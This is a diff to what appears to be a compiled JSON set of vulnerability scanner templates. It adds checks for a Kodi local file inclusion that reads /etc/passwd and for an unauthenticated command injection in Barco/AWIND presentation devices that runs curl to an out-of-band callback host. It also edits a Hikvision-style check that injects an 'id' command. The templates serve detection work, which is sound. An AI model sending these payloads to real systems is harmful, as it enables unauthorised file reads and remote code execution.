@@ -13060,6 +13060,49 @@
       ]
     },
     {
+      "id": "CVE-2017-5982",
+      "info": {
+        "author": "0x_Akoko",
+        "classification": {
+          "cve-id": "CVE-2017-5982",
+          "cvss-metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-98"
+        },
+        "description": "Insufficient validation of user input is performed on this URL resulting in a local file inclusion vulnerability.",
+        "name": "Kodi 17.1 Local File Inclusion",
+        "reference": [
+          "https://cxsecurity.com/issue/WLB-2017020164",
+          "https://www.cvedetails.com/cve/CVE-2017-5982"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2017,kodi,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:[x*]:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/image/image%3A%2F%2F%2e%2e%252fetc%252fpasswd"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-6090",
       "info": {
         "author": "pikpikcu",
@@ -21083,6 +21126,49 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-3929",
+      "info": {
+        "author": "_0xf4n9x_",
+        "classification": {
+          "cve-id": "CVE-2019-3929",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "cvss-score": 9.8,
+          "cwe-id": "CWE-78"
+        },
+        "description": "The Crestron AM-100 firmware 1.6.0.2, Crestron AM-101 firmware 2.7.0.1, Barco wePresent WiPG-1000P firmware 2.3.0.10, Barco wePresent WiPG-1600W before firmware 2.4.1.19, Extron ShareLink 200/250 firmware 2.0.3.4, Teq AV IT WIPS710 firmware 1.1.0.7, SHARP PN-L703WA firmware 1.4.2.3, Optoma WPS-Pro firmware 1.0.0.5, Blackbox HD WPS firmware 1.0.0.5, InFocus LiteShow3 firmware 1.0.16, and InFocus LiteShow4 2.0.0.7 are vulnerable to command injection via the file_transfer.cgi HTTP endpoint. A remote, unauthenticated attacker can use this vulnerability to execute operating system commands as root.",
+        "name": "Barco/AWIND OEM Presentation Platform Unauthenticated Remote Command Injection (CVE-2019-3929)",
+        "reference": [
+          "http://packetstormsecurity.com/files/152715/Barco-AWIND-OEM-Presentation-Platform-Unauthenticated-Remote-Command-Injection.html",
+          "https://www.exploit-db.com/exploits/46786/",
+          "https://nvd.nist.gov/vuln/detail/CVE-2019-3929"
+        ],
+        "severity": "critical",
+        "tags": "rce,cve,cve2019,oast"
+      },
+      "requests": [
+        {
+          "body": "file_transfer=new&dir=%27Pa_Noteexpr%20curl%2bhttp%3a//{{interactsh-url}}Pa_Note%27",
+          "headers": {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/cgi-bin/file_transfer.cgi"
           ]
         }
       ]
@@ -36254,19 +36340,14 @@
           ],
           "matchers": [
             {
+              "condition": "and",
               "dsl": [
-                "contains(body_2,'uid=') && contains(body_2,'gid=')"
+                "contains(body_2,'uid=') && contains(body_2,'gid=')",
+                "status_code_1 == 500 && status_code_2 == 200"
               ],
               "type": "dsl"
-            },
-            {
-              "status": [
-                200
-              ],
-              "type": "status"
             }
           ],
-          "matchers-condition": "and",
           "raw": [
             "PUT /SDK/webLanguage HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><language>$(id>webLib/x)</language>\n",
             "GET /x HTTP/1.1\nHost: {{Hostname}}\n"
